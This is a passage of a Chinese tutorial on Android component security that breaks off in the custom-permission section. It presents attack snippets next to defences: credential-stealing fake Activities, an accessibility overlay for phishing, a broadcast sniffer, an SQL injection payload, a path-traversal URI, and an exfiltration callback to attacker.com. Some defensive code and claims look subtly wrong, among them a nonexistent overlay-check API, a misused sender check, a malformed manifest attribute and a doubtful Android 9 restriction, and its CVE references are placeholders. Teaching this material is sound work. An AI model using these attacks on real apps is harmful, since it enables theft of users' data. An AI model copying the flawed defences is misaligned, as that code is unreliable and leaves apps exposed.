# Android组件安全专题

> 本文档全面深入分析Android四大组件的安全机制、常见漏洞及防御策略，涵盖Activity、Service、BroadcastReceiver、ContentProvider的攻击面与安全最佳实践。

---

## 目录

- [一、Android安全模型概述](#一android安全模型概述)
  - [1.1 沙箱隔离机制](#11-沙箱隔离机制)
  - [1.2 权限模型](#12-权限模型)
  - [1.3 签名机制](#13-签名机制)
- [二、Activity安全](#二activity安全)
  - [2.1 Activity基础](#21-activity基础)
  - [2.2 exported属性风险](#22-exported属性风险)
  - [2.3 隐式Intent风险](#23-隐式intent风险)
  - [2.4 Task和Back Stack安全](#24-task和back-stack安全)
  - [2.5 Activity劫持](#25-activity劫持)
  - [2.6 实战漏洞案例](#26-实战漏洞案例)
- [三、Service安全](#三service安全)
  - [3.1 Service基础](#31-service基础)
  - [3.2 导出Service风险](#32-导出service风险)
  - [3.3 IntentService与JobService](#33-intentservice与jobservice)
  - [3.4 前台Service安全](#34-前台service安全)
  - [3.5 实战漏洞案例](#35-实战漏洞案例)
- [四、BroadcastReceiver安全](#四broadcastreceiver安全)
  - [4.1 BroadcastReceiver基础](#41-broadcastreceiver基础)
  - [4.2 广播窃听](#42-广播窃听)
  - [4.3 广播伪造](#43-广播伪造)
  - [4.4 LocalBroadcastManager](#44-localbroadcastmanager)
  - [4.5 实战漏洞案例](#45-实战漏洞案例)
- [五、ContentProvider安全](#五contentprovider安全)
  - [5.1 ContentProvider基础](#51-contentprovider基础)
  - [5.2 数据泄露](#52-数据泄露)
  - [5.3 SQL注入](#53-sql注入)
  - [5.4 路径遍历](#54-路径遍历)
  - [5.5 URI权限授予](#55-uri权限授予)
  - [5.6 实战漏洞案例](#56-实战漏洞案例)
- [六、Intent安全机制](#六intent安全机制)
  - [6.1 显式Intent与隐式Intent](#61-显式intent与隐式intent)
  - [6.2 PendingIntent安全](#62-pendingintent安全)
  - [6.3 Intent重定向攻击](#63-intent重定向攻击)
  - [6.4 Intent伪造攻击](#64-intent伪造攻击)
- [七、权限强制执行](#七权限强制执行)
  - [7.1 自定义权限](#71-自定义权限)
  - [7.2 运行时权限](#72-运行时权限)
  - [7.3 权限保护级别](#73-权限保护级别)
- [八、ADB调试风险](#八adb调试风险)
  - [8.1 debuggable属性](#81-debuggable属性)
  - [8.2 备份风险](#82-备份风险)
  - [8.3 WebView调试风险](#83-webview调试风险)
- [九、组件安全最佳实践](#九组件安全最佳实践)
  - [9.1 最小暴露原则](#91-最小暴露原则)
  - [9.2 输入验证](#92-输入验证)
  - [9.3 安全配置清单](#93-安全配置清单)

---

## 一、Android安全模型概述

### 1.1 沙箱隔离机制

Android的安全模型基于Linux内核的沙箱隔离机制。每个应用运行在独立的Linux进程中，拥有唯一的Linux用户ID（UID）。应用之间的隔离通过以下机制实现：

```
应用A (UID=10042)          应用B (UID=10043)
+-------------------+      +-------------------+
| Dalvik/ART VM     |      | Dalvik/ART VM     |
| - 进程隔离         |      | - 进程隔离         |
| - UID不同          |      | - UID不同          |
| - 文件权限隔离     |      | - 文件权限隔离     |
+-------------------+      +-------------------+
         |                          |
         v                          v
+-------------------------------------------------+
|              Linux Kernel                       |
| - 用户空间隔离 (UID/GID)                        |
| - 文件系统权限 (rwx)                             |
| - 进程间通信需显式权限                           |
+-------------------------------------------------+
```

关键隔离特性：

- **进程隔离**：每个应用运行在独立进程中，通过Binder IPC进行跨进程通信
- **文件系统隔离**：应用数据目录（/data/data/package_name/）仅对应用自身可读写
- **UID隔离**：每个应用在安装时分配唯一UID，应用以该UID运行
- **共享用户ID（sharedUserId）**：使用相同签名和sharedUserId的应用可共享UID（已废弃）

### 1.2 权限模型

Android权限模型经历了从安装时权限到运行时权限的演进：

**安装时权限（Android 5.x及以下）**

用户在安装应用时一次性授予所有声明权限，无法选择性拒绝。这导致过度权限请求成为常态。

**运行时权限（Android 6.0+）**

危险权限（Dangerous Permissions）需要在运行时动态请求用户授权。权限分为：

| 权限类型 | 保护级别 | 示例 |
|----------|----------|------|
| Normal | 正常 | INTERNET, SET_WALLPAPER |
| Dangerous | 危险 | READ_CONTACTS, CAMERA, ACCESS_FINE_LOCATION |
| Signature | 签名 | 仅同签名应用可申请 |
| SignatureOrSystem | 签名或系统 | 系统应用或同签名应用 |

危险权限分组（同一组内授权一个即授权全组）：

```
权限组                    权限
-----------------------   --------------------------------
CALENDAR                  READ_CALENDAR, WRITE_CALENDAR
CAMERA                    CAMERA
CONTACTS                  READ_CONTACTS, WRITE_CONTACTS, GET_ACCOUNTS
LOCATION                  ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
MICROPHONE                RECORD_AUDIO
PHONE                     READ_PHONE_STATE, CALL_PHONE, READ_CALL_LOG, ...
SENSORS                   BODY_SENSORS
SMS                       SEND_SMS, RECEIVE_SMS, READ_SMS, ...
STORAGE                   READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
```

**特殊权限（Android 11+）**

Android 11引入了特殊权限访问机制，如所有文件访问（MANAGE_EXTERNAL_STORAGE）、精确位置访问等。

### 1.3 签名机制

Android应用签名确保应用完整性并建立信任关系：

- **V1签名（JAR签名）**：基于JAR的签名方式，兼容性好但安全性较低
- **V2签名（APK签名方案v2）**：Android 7.0引入，对整个APK进行签名
- **V3签名（APK签名方案v3）**：Android 9.0引入，支持密钥轮换
- **V4签名（APK签名方案v4）**：Android 11引入，支持增量安装

签名在组件安全中的作用：

- **同一签名的应用**可以共享UID（通过sharedUserId）
- **同一签名的应用**可以申请signature保护级别的自定义权限
- **签名验证**确保应用未被篡改

---

## 二、Activity安全

### 2.1 Activity基础

Activity是Android应用中最核心的组件，代表用户界面的一个屏幕。Activity的生命周期管理对安全性有重要影响：

```
                    +----------+
                    | Created  |
                    +----+-----+
                         |
                         v
                    +----+-----+
          +-------->| Started  |<--------+
          |         +----+-----+         |
          |              |               |
          |              v               |
          |         +----+-----+         |
          |         | Resumed  |         |
    +-----+----+    +----+-----+    +----+-----+
    |  Paused  |         |         |  Saved   |
    +-----+----+         |         +----+-----+
          |              v              |
          |         +----+-----+         |
          +---------+ Stopped  |<--------+
                    +----+-----+
                         |
                         v
                    +----+-----+
                    | Destroyed|
                    +----------+
```

Activity在AndroidManifest.xml中声明：

```xml
<activity
    android:name=".MainActivity"
    android:exported="true"
    android:permission="com.example.permission.LAUNCH"
    android:launchMode="singleTop"
    android:taskAffinity="com.example.app"
    android:noHistory="false"
    android:screenOrientation="portrait">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

### 2.2 exported属性风险

`android:exported`是Activity最重要的安全属性，控制组件是否可被其他应用调用。

| exported值 | 含义 | 安全影响 |
|------------|------|----------|
| true | 可被任何应用调用 | 高风险，需配合权限保护 |
| false | 仅限应用内部调用 | 安全 |
| 未设置 | 根据intent-filter推断 | 有intent-filter则为true，无则为false |

**Android 12+强制声明**

从Android 12开始，包含intent-filter的组件必须显式声明exported属性，否则安装失败。这是Google为减少组件暴露漏洞的重要安全加固。

**风险场景：错误暴露的Activity**

```xml
<!-- 危险配置：暴露了敏感Activity但没有权限保护 -->
<activity
    android:name=".AdminSettingsActivity"
    android:exported="true">  <!-- 不应该暴露！ -->
    <intent-filter>
        <action android:name="com.example.action.ADMIN" />
    </intent-filter>
</activity>
```

攻击方式：

```java
// 攻击者应用直接启动管理界面
Intent intent = new Intent("com.example.action.ADMIN");
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);

// 绕过登录直接进入管理功能
```

**风险场景：未设exported但有intent-filter**

```xml
<!-- Android 11及以下：有intent-filter默认exported=true -->
<activity android:name=".SensitiveActivity">
    <intent-filter>
        <action android:name="com.example.SENSITIVE_ACTION" />
    </intent-filter>
</activity>
<!-- 在Android 11及以下，此Activity默认可被外部调用 -->
```

**防御措施**

```xml
<!-- 正确配置1：不暴露，仅供内部使用 -->
<activity
    android:name=".AdminSettingsActivity"
    android:exported="false" />

<!-- 正确配置2：暴露但需要权限 -->
<activity
    android:name=".ShareActivity"
    android:exported="true"
    android:permission="com.example.permission.SHARE" />

<!-- 正确配置3：暴露但仅限同签名应用 -->
<activity
    android:name=".InternalActivity"
    android:exported="true"
    android:permission="com.example.permission.INTERNAL" />

<!-- 对应权限声明 -->
<permission
    android:name="com.example.permission.SHARE"
    android:protectionLevel="normal" />
<permission
    android:name="com.example.permission.INTERNAL"
    android:protectionLevel="signature" />
```

### 2.3 隐式Intent风险

隐式Intent不指定目标组件名，而是通过action、category、data匹配目标。这引入了Intent劫持风险。

**Intent劫持攻击**

```
正常流程：
  应用A --隐式Intent--> 系统选择 --> 目标Activity

攻击流程：
  应用A --隐式Intent--> 系统选择 --> 攻击者恶意Activity
                                    |
                                    v
                                  伪造界面窃取数据
```

攻击者注册与目标相同的intent-filter：

```xml
<!-- 攻击者应用AndroidManifest.xml -->
<activity android:name=".FakeLoginActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.example.action.LOGIN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

```java
// 攻击者的FakeLoginActivity
public class FakeLoginActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // 获取原始Intent中的数据
        Intent originalIntent = getIntent();
        String username = originalIntent.getStringExtra("username");
        String password = originalIntent.getStringExtra("password");

        // 将窃取的凭证发送到攻击者服务器
        sendToAttacker(username, password);

        // 伪造登录成功，返回给调用方
        Intent resultIntent = new Intent();
        resultIntent.putExtra("status", "success");
        setResult(RESULT_OK, resultIntent);
        finish();
    }
}
```

**防御措施**

```java
// 防御1：使用显式Intent
Intent intent = new Intent(this, TargetActivity.class);
intent.putExtra("data", sensitiveData);
startActivity(intent);

// 防御2：如果必须使用隐式Intent，验证目标组件
Intent intent = new Intent("com.example.action.PROCESS");
intent.putExtra("data", sensitiveData);

// 使用Intent.createChooser强制用户选择
Intent chooser = Intent.createChooser(intent, "选择应用");
startActivity(chooser);

// 防御3：设置包名限制目标范围
intent.setPackage("com.example.target");
startActivity(intent);
```

### 2.4 Task和Back Stack安全

Android Task和Back Stack机制可能被利用进行UI欺骗攻击：

**Task劫持（Task Hijacking）**

攻击者利用`allowTaskReparenting`和`taskAffinity`属性将Activity从原Task转移到恶意Task：

```xml
<!-- 攻击者声明与目标应用相同的taskAffinity -->
<activity
    android:name=".MaliciousActivity"
    android:taskAffinity="com.example.victim"
    android:allowTaskReparenting="true"
    android:exported="true">
</activity>
```

当目标应用被切换到后台时，恶意Activity会被转移到目标应用的Task中，用户切换回应用时看到的是攻击者的界面而非原始界面。

**Android 9.0+ 限制**

从Android 9.0开始，`allowTaskReparenting`和`taskAffinity`的滥用已被限制，系统不允许不同签名的应用使用相同的taskAffinity。

### 2.5 Activity劫持

Activity劫持是一种社会工程学攻击，攻击者监控目标Activity的启动并迅速覆盖恶意界面：

```java
// 攻击者利用辅助功能服务监控前台应用
public class MaliciousAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == TYPE_WINDOW_STATE_CHANGED) {
            String packageName = (String) event.getPackageName();
            if ("com.example.bank".equals(packageName)) {
                // 银行应用启动，立即启动覆盖Activity
                Intent overlay = new Intent(this, FakeBankActivity.class);
                overlay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(overlay);
            }
        }
    }
}
```

**防御措施**

```java
// 检测是否有Activity覆盖在当前Activity上方
@Override
protected void onResume() {
    super.onResume();
    if (isOverlaidByOtherApp()) {
        // 显示安全警告
        showSecurityWarning();
        // 可选：阻止用户继续操作
    }
}

private boolean isOverlaidByOtherApp() {
    WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        return windowManager.getApplicationWindow() != null;
    }
    // 检测Toast或系统窗口覆盖
    // Android 12+提供了setShowWhenLocked和setTurnScreenOn替代方案
    return false;
}

// 使用FLAG_SECURE防止截屏和覆盖
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    getWindow().setFlags(
        WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE
    );
}
```

### 2.6 实战漏洞案例

**案例1：任意Activity调用**

某银行应用暴露了转账Activity但未设置权限：

```xml
<!-- 漏洞配置 -->
<activity android:name=".TransferActivity">
    <intent-filter>
        <action android:name="com.bank.action.TRANSFER" />
    </intent-filter>
</activity>
```

攻击者通过Intent直接调用转账Activity，绕过登录认证：

```java
Intent intent = new Intent("com.bank.action.TRANSFER");
intent.putExtra("account", "attacker_account");
intent.putExtra("amount", 10000);
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);
```

**案例2：CVE-2018-... Activity注入**

多个应用因exported=true且无权限保护导致敏感Activity可被外部调用，攻击者可以：

- 绕过PIN码验证
- 直接访问应用内购买界面
- 调用深层功能绕过安全检查

---

## 三、Service安全

### 3.1 Service基础

Service是Android中用于执行后台长时间运行操作的组件，没有用户界面。Service分为：

- **Started Service**：通过startService()启动，独立运行
- **Bound Service**：通过bindService()绑定，提供IPC接口
- **混合模式**：同时支持start和bind

```xml
<service
    android:name=".BackgroundService"
    android:exported="false"
    android:permission="com.example.permission.BIND_SERVICE"
    android:foregroundServiceType="location">
    <intent-filter>
        <action android:name="com.example.action.BIND" />
    </intent-filter>
</service>
```

### 3.2 导出Service风险

**未保护的Bound Service**

```xml
<!-- 危险：暴露的Bound Service无权限保护 -->
<service android:name=".PaymentService" android:exported="true">
    <intent-filter>
        <action android:name="com.example.action.PAY" />
    </intent-filter>
</service>
```

攻击者绑定到该Service并调用支付接口：

```java
// 攻击者代码
Intent intent = new Intent("com.example.action.PAY");
bindService(intent, connection, Context.BIND_AUTO_CREATE);

private ServiceConnection connection = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 获取Binder接口
        IPaymentInterface payment = IPaymentInterface.Stub.asInterface(service);
        try {
            // 调用支付接口
            payment.makePayment("attacker_account", 10000);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {}
};
```

**Service方法调用风险**

Bound Service通过AIDL暴露方法时，每个方法都需要验证调用者身份：

```java
// 不安全的实现
public class PaymentService extends Service {
    private final IPaymentInterface.Stub binder = new IPaymentInterface.Stub() {
        @Override
        public boolean makePayment(String account, double amount) {
            // 没有验证调用者身份，任何人都可以调用
            return processPayment(account, amount);
        }
    };
}

// 安全的实现
public class PaymentService extends Service {
    private final IPaymentInterface.Stub binder = new IPaymentInterface.Stub() {
        @Override
        public boolean makePayment(String account, double amount) {
            // 验证调用者
            int callerUid = getCallingUid();
            int callerPid = getCallingPid();
            if (!isTrustedCaller(callerUid)) {
                return false;
            }
            return processPayment(account, amount);
        }
    };

    private boolean isTrustedCaller(int uid) {
        // 检查调用者是否是本应用或同签名应用
        PackageManager pm = getPackageManager();
        String[] packages = pm.getPackagesForUid(uid);
        if (packages == null) return false;
        for (String pkg : packages) {
            try {
                Signature[] signatures = pm.getPackageInfo(
                    pkg, PackageManager.GET_SIGNATURES).signatures;
                if (signatures[0].equals(getMySignature())) {
                    return true;
                }
            } catch (Exception e) {}
        }
        return false;
    }
}
```

### 3.3 IntentService与JobService

**IntentService（已废弃，Android 11+推荐使用WorkManager）**

```java
// 不安全：通过外部Intent传递命令
public class CommandService extends IntentService {
    @Override
    protected void onHandleIntent(Intent intent) {
        String cmd = intent.getStringExtra("command");  // 外部可控
        String data = intent.getStringExtra("data");     // 外部可控
        executeCommand(cmd, data);  // 可能执行恶意命令
    }
}
```

**JobService**

```java
// 安全实践：验证调用者
public class SecureJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        // JobScheduler框架调用，相对安全
        // 但仍需验证传入数据
        String taskId = params.getExtras().getString("task_id");
        if (isValidTask(taskId)) {
            processTask(taskId);
        }
        return true;
    }
}
```

### 3.4 前台Service安全

Android 9.0+要求前台Service必须调用startForeground()：

```java
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    // Android 9+必须调用startForeground
    Notification notification = buildNotification();
    startForeground(NOTIFICATION_ID, notification);

    // 验证Intent来源
    if (intent != null && validateCaller()) {
        String action = intent.getAction();
        processAction(action);
    }

    return START_STICKY;
}
```

### 3.5 实战漏洞案例

**案例：消息Service未授权访问**

某即时通讯应用暴露了消息发送Service，攻击者可以：

1. 绑定到暴露的Service
2. 获取消息接口
3. 发送伪造消息
4. 读取其他用户的消息

---

## 四、BroadcastReceiver安全

### 4.1 BroadcastReceiver基础

BroadcastReceiver用于接收系统或应用发送的广播消息。广播分为：

- **普通广播**：异步发送，所有接收者几乎同时接收
- **有序广播**：按优先级顺序传递，可被终止或修改
- **本地广播**：仅在应用内部传递
- **粘性广播**：持久化广播（已废弃）

```xml
<receiver
    android:name=".BootReceiver"
    android:exported="true"
    android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>

<receiver
    android:name=".DataReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.action.DATA_UPDATE" />
    </intent-filter>
</receiver>
```

### 4.2 广播窃听

**风险：暴露的Receiver可被监听**

如果应用通过广播传递敏感数据，攻击者可以注册相同的action来窃听：

```xml
<!-- 正常应用发送广播 -->
<!-- 攻击者注册相同的action -->
<receiver android:name=".SpyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.example.action.DATA_UPDATE" />
    </intent-filter>
</receiver>
```

```java
// 攻击者接收广播中的敏感数据
public class SpyReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String sensitiveData = intent.getStringExtra("token");
        byte[] binaryData = intent.getByteArrayExtra("config");
        // 窃取数据发送到攻击者服务器
        exfiltrate(sensitiveData);
    }
}
```

**防御措施**

```java
// 防御1：使用LocalBroadcastManager（已废弃，推荐使用LiveData或Flow）
LocalBroadcastManager.getInstance(context)
    .sendBroadcast(intent);

// 防御2：发送有序广播并限制权限
context.sendOrderedBroadcast(
    intent,
    "com.example.permission.RECEIVE_DATA",  // 接收者必须持有此权限
    null, null, 0, null, null
);

// 防御3：设置目标包名
intent.setPackage("com.example.target");
context.sendBroadcast(intent);

// 防御4：不通过广播传递敏感数据，改用显式Intent或直接IPC
```

### 4.3 广播伪造

攻击者可以伪造系统广播或其他应用的广播：

```java
// 攻击者伪造广播
Intent fakeBroadcast = new Intent("com.example.action.DATA_UPDATE");
fakeBroadcast.putExtra("token", "attacker_token");
fakeBroadcast.putExtra("is_admin", true);
context.sendBroadcast(fakeBroadcast);
```

如果Receiver信任广播内容而不验证发送者：

```java
// 不安全的Receiver
public class DataReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        boolean isAdmin = intent.getBooleanExtra("is_admin", false);
        if (isAdmin) {
            // 信任了外部传入的权限标志
            grantAdminAccess();
        }
    }
}
```

**防御措施**

```xml
<!-- 限制谁可以发送广播给此Receiver -->
<receiver android:name=".DataReceiver" android:exported="true"
    android:permission="com.example.permission.SEND_DATA">
    <intent-filter>
        <action android:name="com.example.action.DATA_UPDATE" />
    </intent-filter>
</receiver>
```

```java
// 在Receiver中验证发送者
public class DataReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // 验证发送者包名
        String senderPackage = getResultData(); // 或通过其他方式验证
        if (!isTrustedSender(senderPackage)) {
            return;  // 忽略不可信来源的广播
        }
        // 处理可信广播
    }
}
```

### 4.4 LocalBroadcastManager

LocalBroadcastManager确保广播只在应用内部传递，不暴露给其他应用：

```java
// 注册本地广播接收器
LocalBroadcastManager.getInstance(context).registerReceiver(
    receiver,
    new IntentFilter("com.example.LOCAL_ACTION")
);

// 发送本地广播
Intent intent = new Intent("com.example.LOCAL_ACTION");
intent.putExtra("data", sensitiveData);
LocalBroadcastManager.getInstance(context).sendBroadcast(intent);
```

注意：LocalBroadcastManager在AndroidX中已废弃，Google推荐使用LiveData或其他可观察模式替代。

### 4.5 实战漏洞案例

**案例：短信广播伪造**

某应用注册了短信到达广播并自动处理验证码，攻击者通过发送伪造广播注入假验证码：

```java
// 攻击者伪造短信到达广播
Intent fakeSms = new Intent("android.provider.Telephony.SMS_RECEIVED");
fakeSms.putExtra("pdus", new Object[]{fakePdu});
context.sendBroadcast(fakeSms);
```

---

## 五、ContentProvider安全

### 5.1 ContentProvider基础

ContentProvider是Android中跨应用共享数据的标准机制，基于URI进行数据访问：

```xml
<provider
    android:name=".UserDataProvider"
    android:authorities="com.example.provider.userdata"
    android:exported="true"
    android:permission="com.example.permission.READ_USER_DATA"
    android:readPermission="com.example.permission.READ_USER_DATA"
    android:writePermission="com.example.permission.WRITE_USER_DATA"
    android:grantUriPermissions="false"
    android:pathPermission="/secret"
    android:android:multiprocess="false">
</provider>
```

ContentProvider通过URI标识数据：

```
content://com.example.provider.userdata/users/123/profile
        |--------- authority ---------| |-- path --|
```

### 5.2 数据泄露

**未保护的ContentProvider**

```xml
<!-- 危险：暴露的ContentProvider无权限保护 -->
<provider
    android:name=".ContactsProvider"
    android:authorities="com.example.provider.contacts"
    android:exported="true" />
```

攻击者直接查询敏感数据：

```java
// 攻击者代码
Cursor cursor = getContentResolver().query(
    Uri.parse("content://com.example.provider.contacts/users"),
    null, null, null, null
);
while (cursor.moveToNext()) {
    String name = cursor.getString(cursor.getColumnIndex("name"));
    String phone = cursor.getString(cursor.getColumnIndex("phone"));
    String email = cursor.getString(cursor.getColumnIndex("email"));
    // 窃取所有联系人信息
}
```

**防御措施**

```xml
<!-- 正确配置权限 -->
<provider
    android:name=".ContactsProvider"
    android:authorities="com.example.provider.contacts"
    android:exported="true"
    android:readPermission="com.example.permission.READ_CONTACTS"
    android:writePermission="com.example.permission.WRITE_CONTACTS" />
```

### 5.3 SQL注入

ContentProvider的query方法如果未正确处理用户输入，可能存在SQL注入：

```java
// 不安全的实现
@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    // 直接拼接selection，存在SQL注入
    String sql = "SELECT * FROM users WHERE name = '" + selection + "'";
    return db.rawQuery(sql, null);
}

// 攻击者利用
// selection = "' OR '1'='1"
// 实际查询: SELECT * FROM users WHERE name = '' OR '1'='1'
// 返回所有用户数据
```

**安全实现**

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    // 使用参数化查询
    // selection使用占位符，selectionArgs提供参数值
    String safeSelection = "name = ?";
    String[] safeArgs = selectionArgs;

    // 验证projection，防止读取敏感列
    if (projection != null) {
        List<String> allowedColumns = Arrays.asList("name", "avatar");
        for (String col : projection) {
            if (!allowedColumns.contains(col)) {
                throw new IllegalArgumentException("Column not allowed: " + col);
            }
        }
    }

    // 使用SQLiteDatabase的query方法（自动转义）
    return db.query("users", projection, safeSelection,
                     safeArgs, null, null, sortOrder);
}
```

### 5.4 路径遍历

ContentProvider的openFile方法如果未正确处理路径，可能存在路径遍历漏洞：

```java
// 不安全的实现
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getLastPathSegment();
    // 未验证路径，可被遍历
    File file = new File(getContext().getFilesDir(), path);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}

// 攻击者利用
// content://com.example.provider/files/../../../../data/data/com.example/shared_prefs/secrets.xml
```

**安全实现**

```java
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    // 验证路径
    String path = uri.getLastPathSegment();
    if (path == null || path.contains("..") || path.contains("/")) {
        throw new IllegalArgumentException("Invalid path");
    }

    // 限制在指定目录内
    File baseDir = getContext().getFilesDir();
    File file = new File(baseDir, path);

    // 二次验证：确保最终路径在baseDir内
    try {
        String canonicalPath = file.getCanonicalPath();
        String canonicalBase = baseDir.getCanonicalPath();
        if (!canonicalPath.startsWith(canonicalBase)) {
            throw new SecurityException("Path traversal detected");
        }
    } catch (IOException e) {
        throw new SecurityException("Path validation failed", e);
    }

    // 验证文件模式
    int modeFlags = validateMode(mode);
    return ParcelFileDescriptor.open(file, modeFlags);
}
```

### 5.5 URI权限授予

`grantUriPermission`允许临时授予其他应用访问特定URI的权限。这可能导致权限提升：

```java
// 危险：过度授予权限
Intent shareIntent = new Intent(Intent.ACTION_SEND);
shareIntent.setData(Uri.parse("content://com.example.provider/all_data"));
shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
// 将授予接收方对整个provider的读取权限！
```

**安全实践**

```xml
<!-- 限制URI权限授予范围 -->
<provider
    android:name=".SecureProvider"
    android:authorities="com.example.secure"
    android:exported="false"
    android:grantUriPermissions="true">
    <!-- 只允许特定路径授予权限 -->
    <grant-uri-permission android:pathPattern="/share/.*" />
    <!-- 其他路径不允许授权 -->
</provider>
```

```java
// 精确授权
Intent shareIntent = new Intent(Intent.ACTION_SEND);
// 只授予特定URI的权限
shareIntent.setData(Uri.parse("content://com.example.secure/share/photo_123.jpg"));
shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
// 设置精确的目标包名
shareIntent.setPackage("com.example.target");
startActivity(shareIntent);
```

### 5.6 实战漏洞案例

**案例1：CVE-2019-2xxx ContentProvider泄露**

某应用通过暴露的ContentProvider泄露用户位置历史数据，攻击者无需任何权限即可获取。

**案例2：Android Contacts Provider注入**

通过构造特定的selection参数，攻击者可以从系统联系人Provider中获取超出预期范围的数据。

---

## 六、Intent安全机制

### 6.1 显式Intent与隐式Intent

| 特性 | 显式Intent | 隐式Intent |
|------|-----------|-----------|
| 目标指定 | setComponent/setClass/setPackage | action/category/data |
| 安全性 | 高（指定目标） | 低（可能被劫持） |
| 适用场景 | 应用内部组件间通信 | 跨应用功能调用 |
| 劫持风险 | 极低 | 高（需防护） |

### 6.2 PendingIntent安全

PendingIntent是一种特殊的Intent，允许其他应用以本应用的身份执行操作。这引入了严重的安全风险：

**风险：PendingIntent以调用者身份执行**

```java
// 不安全：使用空Intent创建PendingIntent
PendingIntent pi = PendingIntent.getActivity(
    context,
    requestCode,
    new Intent(),  // 空Intent！
    PendingIntent.FLAG_UPDATE_CURRENT
);
// 攻击者可以填充恶意Intent，以本应用身份执行
```

**攻击场景**

```
1. 应用A创建PendingIntent（空Intent，但以A的身份）
2. 应用A将PendingIntent传递给应用B
3. 应用B填充恶意Intent到PendingIntent
4. 恶意Intent以应用A的身份执行
5. 攻击者获得了A的权限
```

**安全实践**

```java
// 安全：使用显式Intent创建PendingIntent
Intent explicitIntent = new Intent(context, TargetActivity.class);
explicitIntent.setAction("com.example.SPECIFIC_ACTION");

PendingIntent pi = PendingIntent.getActivity(
    context,
    requestCode,
    explicitIntent,  // 显式指定目标！
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE  // Android 12+要求IMMUTABLE
);

// Android 12+必须指定MUTABLE或IMMUTABLE标志
// 优先使用IMMUTABLE
PendingIntent immutablePi = PendingIntent.getActivity(
    context, requestCode, explicitIntent,
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
);
```

### 6.3 Intent重定向攻击

Intent重定向（Intent Redirection）是指应用接收外部Intent中的内嵌Intent，并将其作为内部Intent转发执行：

```java
// 不安全：转发接收到的内嵌Intent
public class RedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent received = getIntent();
        // 提取内嵌Intent并直接启动
        Intent innerIntent = (Intent) received.getParcelableExtra("redirect_intent");
        if (innerIntent != null) {
            startActivity(innerIntent);  // 危险！以本应用身份执行
        }
    }
}
```

攻击者可以构造Intent以本应用身份访问内部未暴露的组件：

```java
// 攻击者代码
Intent innerIntent = new Intent();
innerIntent.setClassName("com.example.victim", ".InternalSecretActivity");
innerIntent.putExtra("admin", true);

Intent attackIntent = new Intent();
attackIntent.setClassName("com.example.victim", ".RedirectActivity");
attackIntent.putExtra("redirect_intent", innerIntent);
startActivity(attackIntent);
```

**防御措施**

```java
// 防御：验证内嵌Intent，不转发不可信Intent
public class SafeRedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent received = getIntent();

        // 不从外部Intent提取Intent并执行
        // 如必须转发，验证目标组件
        if (received.hasExtra("redirect_intent")) {
            Intent innerIntent = received.getParcelableExtra("redirect_intent");
            // 验证目标是合法的可暴露组件
            if (isAllowedTarget(innerIntent)) {
                startActivity(innerIntent);
            } else {
                Log.w(TAG, "Blocked intent redirection attempt");
            }
        }
    }

    private boolean isAllowedTarget(Intent intent) {
        ComponentName target = intent.getComponent();
        if (target == null) return false;
        // 白名单检查
        Set<String> allowed = new HashSet<>(Arrays.asList(
            "com.example.victim.PublicActivity",
            "com.example.victim.ShareActivity"
        ));
        return allowed.contains(target.getClassName());
    }
}
```

### 6.4 Intent伪造攻击

攻击者构造恶意Intent发送给目标应用的暴露组件，携带恶意参数：

```java
// 攻击者构造恶意Intent
Intent malicious = new Intent("com.example.action.PROCESS");
malicious.putExtra("url", "file:///data/data/com.example/files/secrets");
malicious.putExtra("callback", "http://attacker.com/exfil");
startActivity(malicious);
```

---

## 七、权限强制执行

### 7.1 自定义权限

应用可以定义自定义权限来保护组件：

```xml
<!-- 定义权限 -->
<permission
    android:name="com.example.permission.ACCESS_PREMIUM"
    android:protectionLevel="signature"
    android:label="@string/permission_premium_label"
    android:description="@string/permission_premium_desc" />

<!-- 在组件上使用权限 -->
<activity
    android:name=".PremiumActivity"
